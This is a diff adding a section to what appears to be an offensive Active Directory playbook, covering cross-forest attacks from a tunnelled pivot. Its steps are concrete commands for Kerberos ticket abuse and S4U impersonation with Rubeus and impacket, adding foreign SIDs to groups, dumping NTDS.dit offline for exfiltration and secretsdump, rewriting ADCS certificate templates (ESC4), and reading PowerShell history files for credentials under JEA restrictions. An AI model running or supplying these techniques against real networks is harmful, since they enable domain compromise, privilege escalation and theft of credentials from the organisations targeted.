@@ -362,3 +362,25 @@ impacket-ticketConverter dc_tgt.kirbi dc_tgt.ccache
 export KRB5CCNAME=dc_tgt.ccache
 impacket-secretsdump -k -no-pass domain.local/<dc_hostname>$@<dc_fqdn>
 ```
+
+---
+
+## Cross-forest ops from a constrained pivot (NAT'd attacker / network-logon jumphost)
+
+Real-case shape: attacker box behind NAT (window-limited tunnel, see `offensive-tools/network/chisel`), foothold = a WinRM **network logon** on a jumphost in realm A, targets in trusted realm B reachable only through that jumphost. Recurring walls and fixes:
+
+- **A network-logon jumphost cannot inject or delegate tickets.** Rubeus `ptt`/`createnetonly` fail there (`LsaLookupAuthenticationPackage Error 1450`; or .NET SSPI `cannot generate SSPI context`) — the WinRM session holds only its inbound service ticket, no delegatable TGT. Do Kerberos in **userland** (impacket reads a ccache, no LSA) or move the ticket-consuming step to a **non-network-logon** (scheduled-task BATCH logon, or a host you hold interactively).
+
+- **Explicit credentials bypass the double-hop without CredSSP/RunAs.** From the jumphost, `New-Object System.DirectoryServices.DirectoryEntry("LDAP://<dcB>/<dn>","<domB>\<user>","<pw>")` and `Invoke-Command -ComputerName <hostB> -Credential <cred>` authenticate with FRESH creds → cross-domain LDAP **writes** and remote reads succeed where `dsacls`/current-token ADSI fail. Use `.psbase` for .NET members; set the DACL mask via `$de.psbase.Options.SecurityMasks=[DirectoryServices.SecurityMasks]::Dacl`. Add a **foreign SID** to a group with `Set-ADObject -Add @{member="<SID=<hexsid>>"}` — the `<SID=hex>` extended form makes the DC auto-create the ForeignSecurityPrincipal; a raw FSP-DN add fails `noSuchObject` and explicit FSP create is `Access denied` for low-priv.
+
+- **Rubeus `s4u` internal `asktgt` fails `KDC_ERR_ETYPE_NOTSUPP` on AES-only realms.** Feed a pre-minted TGT instead of `/user`+`/aes256`: `Rubeus.exe s4u /ticket:<base64 TGT> /impersonateuser:<victim> /msdsspn:<spn> /ptt`. Mint the TGT with impacket `getTGT -aesKey` first (convert ccache→kirbi→base64 with `ticketConverter`).
+
+- **MSSQL S4U needs the port-SPN.** .NET SqlClient requests `MSSQLSvc/<host>:1433`, but the registered SPN is `mssqlsvc/<host>` (no port) → add `/altservice:MSSQLSvc/<host>:1433`. impacket `mssqlclient -k` uses the no-port SPN directly.
+
+- **Cross-realm `getST`/`getTGT` routing over a loopback tunnel.** Do NOT pass `-dc-ip` (it pins every leg to one KDC → `KDC_ERR_WRONG_REALM`). Let krb5.conf route and map the foreign realm + DC names to the tunnel loopback in `/etc/hosts`, FQDN first: `127.0.0.1 dcB.realmB realmB REALMB` — impacket resolves the referral KDC by **realm name**, so the name must point at the tunnel.
+
+- **Prefer offline IFM over network DCSync when the pivot is window-limited.** As local admin on the target DC: `reg save HKLM\SYSTEM` + `ntdsutil "ac i ntds" "ifm" "create full <dir>" q q` (or `reg save` the hive), exfil, then `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`. Avoids a long DRSUAPI session over a tunnel that drops every few seconds.
+
+- **Cross-forest ADCS ESC4** with `certipy template -write-default-configuration` often fails `KDC_ERR_WRONG_REALM` building the cross-forest HOST ticket. Instead set the template directly with a cross-realm `ldap/<ca-dc>` context: `bloodyAD -k -d <ownDom> -u <ca-manager> --host <ca-dc> set object '<template-dn>' msPKI-Certificate-Name-Flag -v -1577058303` then `... add genericAll '<template-dn>' '<enroller>'` (the manual flag alone yields `CERTSRV_E_TEMPLATE_DENIED` — you also need the Enroll ACE). `certipy req` needs `-target-ip <reachable-ca-ip>` when the CA's RPC endpoint resolves to an unreachable internal NIC.
+
+- **JEA `RestrictedRemoteServer` / ConstrainedLanguage file read** (default 8 cmdlets, no FileSystem provider, no `Get-Content`): read any file the RunAs identity can access via the filesystem **variable namespace** — `${C:\path\to\file}` — a core-language read needing no cmdlet or provider. Prime loot: the RunAs account's PSReadLine `...\PSReadLine\ConsoleHost_history.txt` (admins paste `ConvertTo-SecureString` one-liners there).
